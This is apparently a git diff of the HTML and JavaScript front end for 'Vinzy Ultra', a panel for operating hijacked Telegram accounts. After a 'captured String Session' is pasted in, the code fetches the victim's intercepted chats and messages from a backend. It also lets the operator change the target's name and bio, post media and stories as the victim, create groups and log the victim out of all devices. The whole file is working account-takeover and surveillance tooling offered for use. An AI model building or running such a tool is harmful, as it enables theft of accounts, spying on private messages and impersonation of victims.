@@ -2,352 +2,456 @@
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <title>Vinzy Ultra | Live Mirror Session</title>
+    <title>Vinzy Ultra | Premium Admin Controller</title>
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
     
-    <link rel="stylesheet" href="https://web.telegram.org/k/index-q1C_GO8L.css">
-    
     <style>
+        /* --- CORE THEME 2026 --- */
         :root {
-            --mirror-accent: #3390ec;
-            --mirror-bg: #0f0f0f;
-            --sidebar-width: 400px;
-            --msg-in-bg: #212121;
-            --msg-out-bg: #2b5278;
+            --accent: #8774e1;
+            --accent-glow: rgba(135, 116, 225, 0.3);
+            --bg-dark: #0a0a0a;
+            --sidebar-bg: #121212;
+            --glass: rgba(255, 255, 255, 0.03);
+            --glass-thick: rgba(255, 255, 255, 0.07);
+            --border: rgba(255, 255, 255, 0.1);
             --text-main: #ffffff;
-            --text-dim: #aaaaaa;
+            --text-dim: #888888;
+            --msg-in: #212121;
+            --msg-out: #3d6a97;
+            --danger: #ff4757;
         }
 
-        body.dark-mode {
-            background-color: var(--mirror-bg) !important;
+        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
+
+        body {
+            background-color: var(--bg-dark);
             color: var(--text-main);
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex !important;
-            flex-direction: row !important;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-
-        /* --- SIDEBAR STYLING --- */
-        #mirror-sidebar {
-            width: var(--sidebar-width);
-            height: 100vh;
-            border-right: 1px solid rgba(255, 255, 255, 0.08);
-            background: #1c1c1c;
-            display: flex;
-            flex-direction: column;
-            flex-shrink: 0;
-            z-index: 100;
-        }
-
-        .mirror-header {
-            padding: 16px 20px;
-            background: #242424;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-        }
-
-        .header-top {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .vinzy-brand {
-            font-weight: 700;
-            letter-spacing: 1px;
-            color: var(--mirror-accent);
-            font-size: 18px;
-        }
-
-        .live-indicator {
-            background: #ff3b30;
-            color: white;
-            padding: 3px 8px;
-            border-radius: 12px;
-            font-size: 11px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            animation: blink 2s infinite;
-        }
-
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
-
-        .search-container {
-            position: relative;
-            background: #0f0f0f;
-            border-radius: 8px;
-            padding: 8px 12px;
-            display: flex;
-            align-items: center;
-        }
-
-        .search-container input {
-            background: transparent;
-            border: none;
-            color: white;
-            width: 100%;
-            font-size: 14px;
-            outline: none;
-        }
-
-        /* --- CHAT LIST STYLING --- */
-        .chat-list-scroll {
-            overflow-y: auto;
-            flex-grow: 1;
-            scrollbar-width: thin;
-            scrollbar-color: #333 transparent;
-        }
-
-        .chat-item-mirror {
-            padding: 12px 16px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            cursor: pointer;
-            transition: background 0.2s;
-            position: relative;
-        }
-
-        .chat-item-mirror:hover { background: #2c2c2c; }
-        .chat-item-mirror.active { background: #2b52784d; border-left: 4px solid var(--mirror-accent); }
-
-        .avatar-mock {
-            width: 54px;
-            height: 54px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #3390ec, #1c548a);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 600;
-            font-size: 20px;
-            color: white;
-            flex-shrink: 0;
-            text-transform: uppercase;
-        }
-
-        .chat-details {
-            flex-grow: 1;
-            overflow: hidden;
-        }
-
-        .chat-top-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 4px;
-        }
-
-        .chat-title {
-            font-weight: 600;
-            font-size: 16px;
-            color: #fff;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .chat-time {
-            font-size: 12px;
-            color: var(--text-dim);
-        }
-
-        .chat-preview {
-            font-size: 14px;
-            color: var(--text-dim);
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        /* --- MAIN VIEW STYLING --- */
-        #mirror-main {
-            flex-grow: 1;
             height: 100vh;
             display: flex;
-            flex-direction: column;
-            background: #0e0e0e;
+            overflow: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* --- SKELETON ANIMATION --- */
+        @keyframes shimmer {
+            0% { background-position: -468px 0; }
+            100% { background-position: 468px 0; }
+        }
+        .skeleton {
+            background: linear-gradient(90deg, #1a1a1a 25%, #222 50%, #1a1a1a 75%);
+            background-size: 800px 104px;
+            animation: shimmer 1.5s infinite linear;
+        }
+
+        /* --- AUTHENTICATION OVERLAY --- */
+        #auth-layer {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.92);
+            backdrop-filter: blur(50px); z-index: 9999;
+            display: flex; align-items: center; justify-content: center;
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .auth-card {
+            background: var(--glass-thick); padding: 50px 40px; border-radius: 40px;
+            border: 1px solid var(--border); text-align: center; width: 420px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+        }
+        .auth-card h1 { font-size: 28px; font-weight: 800; letter-spacing: -1px; margin-bottom: 8px; }
+        .auth-card p { color: var(--text-dim); font-size: 14px; margin-bottom: 35px; line-height: 1.5; }
+
+        /* --- SIDEBAR --- */
+        #sidebar {
+            width: 400px; background: var(--sidebar-bg); border-right: 1px solid var(--border);
+            display: flex; flex-direction: column; z-index: 100; transition: transform 0.4s ease;
+        }
+        .sidebar-header {
+            padding: 30px 25px; border-bottom: 1px solid var(--border);
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .search-area { padding: 15px 20px; }
+        .search-inner {
+            background: #000; border: 1px solid var(--border); border-radius: 14px;
+            padding: 12px 16px; display: flex; align-items: center; gap: 10px;
+        }
+        .search-inner input { background: transparent; border: none; color: #fff; width: 100%; font-size: 14px; }
+
+        .chat-list { flex: 1; overflow-y: auto; scrollbar-width: none; }
+        .chat-item {
+            padding: 16px 25px; display: flex; gap: 18px; cursor: pointer;
+            transition: 0.3s; border-bottom: 1px solid rgba(255,255,255,0.03);
+            align-items: center;
+        }
+        .chat-item:hover { background: var(--glass); }
+        .chat-item.active { background: rgba(135, 116, 225, 0.12); border-left: 4px solid var(--accent); }
+
+        .pfp-wrap { position: relative; }
+        .avatar {
+            width: 58px; height: 58px; border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent), #5a4bb3);
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 22px; color: #fff; flex-shrink: 0;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+
+        /* --- MAIN CHAT VIEW --- */
+        #main-view {
+            flex: 1; display: flex; flex-direction: column; background: #080808;
             position: relative;
         }
-
-        .target-bar {
-            padding: 12px 25px;
-            background: #1c1c1c;
-            border-bottom: 1px solid #333;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            z-index: 10;
+        .nav-bar {
+            padding: 18px 30px; background: rgba(18, 18, 18, 0.85);
+            backdrop-filter: blur(25px); border-bottom: 1px solid var(--border);
+            display: flex; align-items: center; gap: 15px; z-index: 50;
         }
-
-        .target-status {
-            font-size: 12px;
-            color: #4caf50;
-        }
-
         .msg-container {
-            flex-grow: 1;
-            padding: 25px 50px;
-            overflow-y: auto;
-            background: url('https://web.telegram.org/k/assets/img/bg-dark.png');
+            flex: 1; padding: 25px 12%; overflow-y: auto;
+            display: flex; flex-direction: column; gap: 12px;
+            background: url('https://web.telegram.org/a/chat-bg-dark.7dae36a445d45d8f7601.png') center;
             background-size: cover;
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
         }
 
-        /* --- BUBBLE STYLING --- */
-        .msg-bubble {
-            max-width: 550px;
-            padding: 10px 14px;
-            border-radius: 15px;
-            font-size: 15px;
-            line-height: 1.5;
-            position: relative;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
-            word-wrap: break-word;
+        .bubble {
+            max-width: 65%; padding: 12px 18px; border-radius: 20px;
+            font-size: 15px; line-height: 1.6; position: relative;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            animation: slideUp 0.3s ease;
         }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .bubble.in { align-self: flex-start; background: var(--msg-in); border-bottom-left-radius: 5px; color: #eee; }
+        .bubble.out { align-self: flex-end; background: var(--msg-out); border-bottom-right-radius: 5px; color: #fff; }
 
-        .msg-bubble.in { 
-            background: var(--msg-in-bg); 
-            align-self: flex-start; 
-            border-bottom-left-radius: 5px;
-            color: #eee;
+        .meta { font-size: 10px; margin-top: 5px; opacity: 0.6; text-align: right; }
+
+        /* --- COMMAND CENTER (FAB & MODAL) --- */
+        .fab {
+            position: fixed; bottom: 40px; right: 40px;
+            width: 70px; height: 70px; background: var(--accent);
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            cursor: pointer; box-shadow: 0 15px 45px var(--accent-glow);
+            z-index: 1000; font-size: 30px; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
+        .fab:hover { transform: rotate(180deg) scale(1.1); background: #9b89f1; }
 
-        .msg-bubble.out { 
-            background: var(--msg-out-bg); 
-            align-self: flex-end; 
-            border-bottom-right-radius: 5px;
-            color: #fff;
+        #modal-overlay {
+            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(25px); z-index: 2000; align-items: center; justify-content: center;
         }
-
-        .msg-meta {
-            display: flex;
-            justify-content: flex-end;
-            align-items: center;
-            gap: 4px;
-            font-size: 11px;
-            margin-top: 4px;
-            opacity: 0.7;
+        .modal-box {
+            background: #181818; width: 500px; border-radius: 35px;
+            border: 1px solid var(--border); overflow: hidden;
+            box-shadow: 0 50px 100px rgba(0,0,0,0.6);
         }
+        .modal-tabs { display: flex; background: #222; border-bottom: 1px solid var(--border); }
+        .m-tab { 
+            flex: 1; padding: 18px; text-align: center; cursor: pointer; 
+            font-size: 13px; font-weight: 600; color: var(--text-dim);
+            transition: 0.3s;
+        }
+        .m-tab.active { color: #fff; background: #2a2a2a; border-bottom: 3px solid var(--accent); }
 
-        .read-check { color: #4caf50; font-weight: bold; }
+        .modal-body { padding: 35px; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; font-size: 12px; color: var(--text-dim); margin-bottom: 8px; font-weight: 600; }
+        
+        input, textarea, select {
+            width: 100%; background: #000; border: 1px solid #333;
+            padding: 16px; color: #fff; border-radius: 14px;
+            font-family: inherit; font-size: 14px; transition: 0.3s;
+        }
+        input:focus { border-color: var(--accent); box-shadow: 0 0 10px var(--accent-glow); }
 
-        /* --- BOTTOM BAR --- */
-        .input-blocked-bar {
-            padding: 18px;
-            background: #1c1c1c;
-            color: var(--text-dim);
-            text-align: center;
-            font-size: 14px;
-            border-top: 1px solid #333;
-            font-weight: 500;
+        .btn-prime {
+            width: 100%; background: var(--accent); color: white; border: none;
+            padding: 18px; border-radius: 16px; font-weight: 700; cursor: pointer;
+            font-size: 15px; transition: 0.3s;
+        }
+        .btn-prime:hover { background: #9b89f1; transform: translateY(-2px); }
+
+        .blur-lock { filter: blur(40px); pointer-events: none; opacity: 0.3; }
+        
+        /* --- RESPONSIVE --- */
+        @media (max-width: 900px) {
+            #sidebar { width: 100%; position: absolute; left: 0; top: 0; height: 100%; }
+            #main-view { display: none; }
+            .sidebar-header { padding: 20px; }
         }
     </style>
 </head>
-<body class="animation-level-2 has-auth-pages dark-mode">
+<body>
 
-    <aside id="mirror-sidebar">
-        <div class="mirror-header">
-            <div class="header-top">
-                <span class="vinzy-brand">VINZY ULTRA</span>
-                <span class="live-indicator">
-                    <span style="width:8px; height:8px; background:white; border-radius:50%;"></span>
-                    LIVE
-                </span>
+    <div id="auth-layer">
+        <div class="auth-card">
+            <div class="avatar" style="margin: 0 auto 20px; width: 80px; height: 80px; font-size: 32px;">V</div>
+            <h1>Vinzy Ultra Controller</h1>
+            <p>The mirroring engine is currently locked. Enter the captured String Session to begin account interception.</p>
+            <div class="input-group">
+                <input type="password" id="sessionStr" placeholder="AQJH_Example_String_Session...">
             </div>
-            <div class="search-container">
-                <input type="text" placeholder="Search for chats..." id="chatSearch">
+            <button class="btn-prime" onclick="initUnlock()">Establish Connection</button>
+        </div>
+    </div>
+
+    <aside id="sidebar" class="blur-lock">
+        <div class="sidebar-header">
+            <div>
+                <h2 style="font-weight: 900; letter-spacing: 1px; color: var(--accent);">VINZY ULTRA</h2>
+                <p style="font-size: 11px; color: #4caf50; font-weight: bold;">● MIRRORING ACTIVE</p>
+            </div>
+            <div style="background: var(--glass-thick); padding: 8px 12px; border-radius: 10px; font-size: 12px;">v5.5</div>
+        </div>
+
+        <div class="search-area">
+            <div class="search-inner">
+                <span>🔍</span>
+                <input type="text" id="chatSearch" placeholder="Filter intercepted chats..." onkeyup="filterChats()">
             </div>
         </div>
 
-        <div class="chat-list-scroll">
-            {% if not chats %}
-            <div style="padding: 40px; text-align: center; color: #555;">No active chats found.</div>
-            {% endif %}
-            
-            {% for chat in chats %}
-            <div class="chat-item-mirror {% if chat.id|string == active_id|string %}active{% endif %}" 
-                 onclick="location.href='/mirror/{{ phone }}/{{ chat.id }}'">
-                <div class="avatar-mock">{{ chat.title[0]|upper }}</div>
-                <div class="chat-details">
-                    <div class="chat-top-row">
-                        <div class="chat-title">{{ chat.title }}</div>
-                        <div class="chat-time">{{ chat.last_time }}</div>
-                    </div>
-                    <div class="chat-preview">{{ chat.last_msg }}</div>
-                </div>
-            </div>
-            {% endfor %}
+        <div class="chat-list" id="chatContainer">
+            <div class="chat-item"><div class="avatar skeleton"></div><div style="flex:1"><div class="skeleton" style="height:15px; width:60%; margin-bottom:8px;"></div><div class="skeleton" style="height:12px; width:40%;"></div></div></div>
+            <div class="chat-item"><div class="avatar skeleton"></div><div style="flex:1"><div class="skeleton" style="height:15px; width:70%; margin-bottom:8px;"></div><div class="skeleton" style="height:12px; width:30%;"></div></div></div>
+            <div class="chat-item"><div class="avatar skeleton"></div><div style="flex:1"><div class="skeleton" style="height:15px; width:50%; margin-bottom:8px;"></div><div class="skeleton" style="height:12px; width:50%;"></div></div></div>
         </div>
     </aside>
 
-    <main id="mirror-main">
-        <header class="target-bar">
-            <div class="avatar-mock" style="width:42px; height:42px; font-size:16px;">
-                {{ active_chat_name[0]|upper if active_chat_name else '?' }}
+    <main id="main-view" class="blur-lock">
+        <nav class="nav-bar">
+            <div id="target-avatar" class="avatar" style="width:45px; height:45px; font-size:16px;">?</div>
+            <div style="flex: 1;">
+                <div id="target-name" style="font-weight: 700; font-size: 17px;">Select a Conversation</div>
+                <div id="target-status" style="font-size: 12px; color: var(--text-dim);">Historical Stream</div>
             </div>
-            <div>
-                <div style="font-weight: 600; font-size: 17px;">{{ active_chat_name or 'Select a conversation' }}</div>
-                <div class="target-status">Connected to +{{ phone }}</div>
-            </div>
-        </header>
+            <div style="cursor: pointer; opacity: 0.5;">⋮</div>
+        </nav>
 
         <div class="msg-container" id="msgBox">
-            {% if not messages %}
-            <div style="margin: auto; background: rgba(0,0,0,0.5); padding: 10px 20px; border-radius: 20px; font-size: 13px;">
-                Select a chat to view intercepted messages
+            <div style="margin: auto; text-align: center; color: var(--text-dim);">
+                <p style="font-size: 40px; margin-bottom: 10px;">💬</p>
+                <p>Select a chat from the left to view<br>live intercepted messages.</p>
             </div>
-            {% endif %}
-
-            {% for msg in messages %}
-            <div class="msg-bubble {% if msg.out %}out{% else %}in{% endif %}">
-                <div class="msg-text">{{ msg.text }}</div>
-                <div class="msg-meta">
-                    <span class="msg-time">{{ msg.time }}</span>
-                    {% if msg.out %}
-                    <span class="read-check">✓✓</span>
-                    {% endif %}
-                </div>
-            </div>
-            {% endfor %}
         </div>
-        
-        <footer class="input-blocked-bar">
-            🔒 <b>READ-ONLY ACCESS:</b> Monitoring session active. User response is disabled for security.
-        </footer>
+
+        <div style="background: #121212; padding: 12px 30px; display: flex; justify-content: space-between; font-size: 11px; color: #555; border-top: 1px solid var(--border);">
+            <span>PROTOCOL: TELETHON_MIRROR_V5</span>
+            <span>END-TO-END ENCRYPTED ADMIN CHANNEL</span>
+        </div>
     </main>
 
-    <script>
-        // Automatic Refresh Logic (12-second interval)
-        // Keeps the session fresh without flooding the DC
-        const refreshRate = 12000; 
-        setTimeout(() => {
-            location.reload();
-        }, refreshRate);
+    <div class="fab" onclick="toggleConsole()">⚙️</div>
 
-        // Keep the message view pinned to the bottom on load
-        const msgBox = document.getElementById('msgBox');
-        if (msgBox) {
-            msgBox.scrollTop = msgBox.scrollHeight;
+    <div id="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-tabs">
+                <div class="m-tab active" data-target="p-panel" onclick="switchTab(this)">PROFILE</div>
+                <div class="m-tab" data-target="m-panel" onclick="switchTab(this)">POST/MEDIA</div>
+                <div class="m-tab" data-target="c-panel" onclick="switchTab(this)">CONTROL</div>
+            </div>
+
+            <div class="modal-body">
+                <div id="p-panel" class="tab-content">
+                    <div class="input-group">
+                        <label>FULL NAME</label>
+                        <input type="text" id="ctrl-name" placeholder="Target's New Name">
+                    </div>
+                    <div class="input-group">
+                        <label>BIO / ABOUT</label>
+                        <textarea id="ctrl-bio" rows="3" placeholder="Change user bio..."></textarea>
+                    </div>
+                    <button class="btn-prime" onclick="apiAction('update_profile')">UPDATE IDENTITY</button>
+                </div>
+
+                <div id="m-panel" class="tab-content" style="display: none;">
+                    <div class="input-group">
+                        <label>MEDIA TYPE</label>
+                        <select id="ctrl-media-type">
+                            <option value="photo">Photo Post</option>
+                            <option value="voice">Voice Message</option>
+                            <option value="file">Document/File</option>
+                            <option value="story">Account Story</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>DIRECT MEDIA URL</label>
+                        <input type="text" id="ctrl-media-url" placeholder="https://site.com/image.jpg">
+                    </div>
+                    <div class="input-group">
+                        <label>CAPTION (OPTIONAL)</label>
+                        <input type="text" id="ctrl-caption" placeholder="Enter message text...">
+                    </div>
+                    <button class="btn-prime" onclick="apiAction('post_media')">POST TO TARGET ACCOUNT</button>
+                </div>
+
+                <div id="c-panel" class="tab-content" style="display: none;">
+                    <p style="font-size: 13px; color: var(--text-dim); margin-bottom: 20px;">Administrative actions for account manipulation.</p>
+                    <div class="input-group">
+                        <label>GROUP TITLE</label>
+                        <input type="text" id="ctrl-group-name" placeholder="Cyber Security Group...">
+                    </div>
+                    <button class="btn-prime" style="background: #2f3542; margin-bottom: 15px;" onclick="apiAction('create_group')">CREATE NEW GROUP</button>
+                    <button class="btn-prime" style="background: var(--danger);" onclick="confirmTerminate()">TERMINATE ALL SESSIONS</button>
+                </div>
+
+                <p style="text-align:center; margin-top:25px; color:var(--text-dim); cursor:pointer; font-size:12px; font-weight:bold;" onclick="toggleConsole()">CLOSE CONSOLE</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        /**
+         * VINZY ULTRA CORE LOGIC
+         * Handles mirroring, API calls, and UI state
+         */
+        const BACKEND_URL = "https://your-api.koyeb.app"; // ⚡ Update this!
+        let SESSION_KEY = "";
+        let CURRENT_CHAT_ID = null;
+
+        // --- 1. AUTHENTICATION ---
+        function initUnlock() {
+            const val = document.getElementById('sessionStr').value;
+            if(val.trim().length < 15) {
+                alert("Critical Error: Invalid String Session length.");
+                return;
+            }
+            SESSION_KEY = val;
+            
+            // UI Transition
+            const layer = document.getElementById('auth-layer');
+            layer.style.opacity = '0';
+            setTimeout(() => {
+                layer.style.display = 'none';
+                document.getElementById('sidebar').classList.remove('blur-lock');
+                document.getElementById('main-view').classList.remove('blur-lock');
+                fetchChats();
+            }, 800);
         }
 
-        // Search filtering (Client-side)
-        document.getElementById('chatSearch').addEventListener('input', function(e) {
-            const term = e.target.value.toLowerCase();
-            const chats = document.querySelectorAll('.chat-item-mirror');
-            chats.forEach(chat => {
-                const title = chat.querySelector('.chat-title').innerText.toLowerCase();
-                chat.style.display = title.includes(term) ? 'flex' : 'none';
+        // --- 2. DATA FETCHING ---
+        async function fetchChats() {
+            const container = document.getElementById('chatContainer');
+            try {
+                const response = await fetch(`${BACKEND_URL}/get_chats?session=${SESSION_KEY}`);
+                const data = await response.json();
+                
+                if(data.status === "error") throw new Error(data.msg);
+
+                container.innerHTML = data.chats.map(chat => `
+                    <div class="chat-item" onclick="selectChat('${chat.id}', '${chat.title}')">
+                        <div class="pfp-wrap">
+                            <div class="avatar">${chat.title[0].toUpperCase()}</div>
+                        </div>
+                        <div style="flex: 1; min-width: 0;">
+                            <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
+                                <strong style="font-size: 15px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${chat.title}</strong>
+                                <span style="font-size: 11px; color: var(--text-dim);">${chat.time || 'Live'}</span>
+                            </div>
+                            <div style="font-size: 13px; color: var(--text-dim); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
+                                ${chat.last_msg || 'No messages intercepted'}
+                            </div>
+                        </div>
+                    </div>
+                `).join('');
+
+            } catch (err) {
+                container.innerHTML = `<div style="padding:40px; text-align:center; color:var(--danger);">Connection Failed: ${err.message}</div>`;
+            }
+        }
+
+        async function selectChat(id, title) {
+            CURRENT_CHAT_ID = id;
+            document.getElementById('target-name').innerText = title;
+            document.getElementById('target-avatar').innerText = title[0].toUpperCase();
+            
+            // Highlight active chat
+            document.querySelectorAll('.chat-item').forEach(el => el.classList.remove('active'));
+            event.currentTarget.classList.add('active');
+
+            const msgBox = document.getElementById('msgBox');
+            msgBox.innerHTML = '<div class="skeleton" style="height:40px; width:60%; border-radius:15px; margin: 10px 0;"></div><div class="skeleton" style="height:40px; width:50%; border-radius:15px; align-self: flex-end; margin: 10px 0;"></div>';
+
+            try {
+                const res = await fetch(`${BACKEND_URL}/get_messages?session=${SESSION_KEY}&chat_id=${id}`);
+                const data = await res.json();
+                
+                msgBox.innerHTML = data.messages.map(m => `
+                    <div class="bubble ${m.out ? 'out' : 'in'}">
+                        ${m.text}
+                        <div class="meta">${m.time} ${m.out ? '✓✓' : ''}</div>
+                    </div>
+                `).join('');
+                msgBox.scrollTop = msgBox.scrollHeight;
+
+            } catch (e) {
+                msgBox.innerHTML = `<p style="color:var(--danger); text-align:center;">Intercept Error: ${e.message}</p>`;
+            }
+        }
+
+        // --- 3. CONSOLE LOGIC ---
+        function toggleConsole() {
+            const overlay = document.getElementById('modal-overlay');
+            overlay.style.display = (overlay.style.display === 'flex') ? 'none' : 'flex';
+        }
+
+        function switchTab(el) {
+            document.querySelectorAll('.m-tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
+            
+            el.classList.add('active');
+            document.getElementById(el.getAttribute('data-target')).style.display = 'block';
+        }
+
+        async function apiAction(endpoint) {
+            const payload = {
+                session: SESSION_KEY,
+                name: document.getElementById('ctrl-name').value,
+                bio: document.getElementById('ctrl-bio').value,
+                media_url: document.getElementById('ctrl-media-url').value,
+                caption: document.getElementById('ctrl-caption').value,
+                group_title: document.getElementById('ctrl-group-name').value
+            };
+
+            const btn = event.target;
+            const originalText = btn.innerText;
+            btn.innerText = "EXECUTING...";
+            btn.disabled = true;
+
+            try {
+                const res = await fetch(`${BACKEND_URL}/${endpoint}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(payload)
+                });
+                const result = await res.json();
+                
+                if(result.status === "success") {
+                    alert("✅ SUCCESS: Target account updated.");
+                    toggleConsole();
+                } else {
+                    alert("❌ FAILED: " + result.msg);
+                }
+            } catch (e) {
+                alert("❌ Connection Error.");
+            } finally {
+                btn.innerText = originalText;
+                btn.disabled = false;
+            }
+        }
+
+        // --- 4. UTILS ---
+        function filterChats() {
+            const q = document.getElementById('chatSearch').value.toLowerCase();
+            document.querySelectorAll('.chat-item').forEach(item => {
+                const text = item.innerText.toLowerCase();
+                item.style.display = text.includes(q) ? 'flex' : 'none';
             });
-        });
+        }
+
+        function confirmTerminate() {
+            if(confirm("CRITICAL: This will log out the victim from all devices. Proceed?")) {
+                apiAction('terminate_sessions');
+            }
+        }
     </script>
 </body>
 </html>
